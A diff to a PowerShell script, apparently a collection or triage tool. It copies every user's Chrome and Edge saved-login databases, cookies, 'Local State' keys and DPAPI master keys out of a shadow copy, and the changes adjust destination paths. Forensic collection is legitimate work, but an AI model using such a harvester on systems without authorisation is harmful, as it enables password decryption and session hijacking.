@@ -68,15 +68,16 @@ function Chromedge-Copy ($usersDir) {
     $edgeUserDestDir = ($edgeDestDir + $usersDir.Name + '\'); New-Item $edgeUserDestDir -ItemType Directory -ea 0
     $edgeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Microsoft\Edge\User Data\')
 
-    Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDestDir)
-    Copy-Item -Force ($edgeUserDataDir + '\Local State') -Destination ($edgeUserDestDir)
+    Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDestDir + '\User data\')
+    Copy-Item -Force ($edgeUserDataDir + '\Local State') -Destination ($edgeUserDestDir + 'User Data')
 
     foreach ($profile in (gci -Path $chromeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
         $chromeProfileDestDir = ($chromeUserDestDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDestDir -ItemType Directory -ea 0
         Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $chromeProfileDestDir
         Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $chromeProfileDestDir
         $cookChromePath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
-        cmd /c copy $cookChromePath $chromeProfileDestDir
+        $cookChromeDestPath = ($chromeProfileDestDir + '\Network\')
+        cmd /c copy $cookChromePath $cookChromeDestPath
     }
 
     foreach ($profile in (gci -Path $edgeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
@@ -84,8 +85,8 @@ function Chromedge-Copy ($usersDir) {
         Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $edgeProfileDestDir
         Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $edgeProfileDestDir
         $cookEdgePath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
-        echo $cookEdgePath
-        cmd /c copy $cookEdgePath $edgeProfileDestDir
+        $cookEdgeDestPath = ($edgeProfileDestDir + '\Network\')
+        cmd /c copy $cookEdgePath $cookEdgeDestPath
     }
 }
 
@@ -148,7 +149,7 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
         $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")
 
         foreach ($usersDir in (gci $srcdir)) {
-            if ($usersDir.Name -eq "Public") { continue }
+            IF (($usersDir.Name -eq "Public") -OR ($usersDir.Name -eq "All Users") -OR ($usersDir.Name -eq "Default User") -OR ($usersDir.Name -eq "Default")) { continue }
             Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($browsersDestDir)
             attrib.exe -h -s ($browsersDestDir + '\*') /s
             Chromedge-Copy ($usersDir)
